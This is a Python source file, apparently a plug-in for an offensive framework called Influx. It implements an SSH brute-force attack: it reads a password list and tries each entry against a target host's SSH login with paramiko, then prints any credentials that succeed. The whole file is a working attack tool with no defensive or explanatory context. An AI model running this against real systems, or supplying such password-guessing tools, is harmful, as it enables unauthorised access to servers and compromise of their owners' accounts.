from __future__ import print_function
import os
import sys
import socket
import paramiko

#Influx Default Modules Import
Modules_Path = os.path.abspath(os.path.join('..', '..', 'Modules'))
sys.path.append(Modules_Path)
from Modules.InfluxPrint import *
from Modules.InfluxExceptions import *

class infmod:
   #Influx Section
   def __init__(self):
       self.name = "SSH BruteForce"
       self.description = "This Module Will BruteForce A SSH Server With The Given Username And The Password File\n"
       self.parameters = {"Host":None, "Username":None, "PasswordFile":None}

   def __str__(self):
       return "[" + self.name + "] Influx Module Object."

   def run(self):
     influx_module_main(self.parameters)

#Defining Functions

def ssh_connect(username, password, stat = 0):
   ssh = paramiko.SSHClient();
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

   try:
      ssh.connect(host, port=22, username=username, password=password)
   except paramiko.AuthenticationException:
      stat = 1
   except socket.error as e:
      stat = 2
   ssh.close()
   return stat

def influx_module_main(prams):
    global host
    try:
       host = prams["Host"]
       username = prams["Username"]
       passfile = prams["PasswordFile"]
       if os.path.exists(passfile) == False:
          print(Status["ERROR"] +"Password File Does Not Exist.")
          raise StopModuleException("Password File Does Not Exist")
    except Exception as e:
        print(Status["ERROR"] + "Something Went Wrong.")
        raise StopModuleException(e)
        print("")
    print(Status["INFO"] +"SSH BruteForcer")
    print(Status["INFO"] +"Host: " + host)
    print(Status["INFO"] +"Username: " + username)
    print(Status["INFO"] +"Passwords: " + passfile)
    print("")
    print(Status["JOB"] +"BruteForce Started")
    print("")
    print("----------------------------------------------")
    print("")
    passwords = open(passfile);
    for password in passwords:
       password = password.strip("\n");
       try:
          res = ssh_connect(username, password)
          if res == 1:
             print (Color["RED"] + "[+]Auth Faild" + Color["ENDC"], end=" ")
             print(": User:{0} Pass:{1}".format(username, password))

          if res == 2:
             print(Status["ERROR"] +"Host Down")

          if res == 0:
             print (Color["GREEN"] + "[+]Auth Succeed" + Color["ENDC"], end=" ")
             print(":Password Found: User:{0} Pass:{1}".format(username, password))
       except Exception as e:
          print(Status["ERROR"] +"Error:" + str(e))
          pass
       except KeyboardInterrupt:
       	  print("")
       	  print(Status["INFO"] +"User Interrupted The Proccess")
       	  print(Status["INFO"] +"Job Finished!")
          raise ModuleKeyboardInterrupt()

    passwords.close()
    print("")
    print("----------------------------------------------")
    print("")
    print(Status["INFO"] +"Job Finished!")
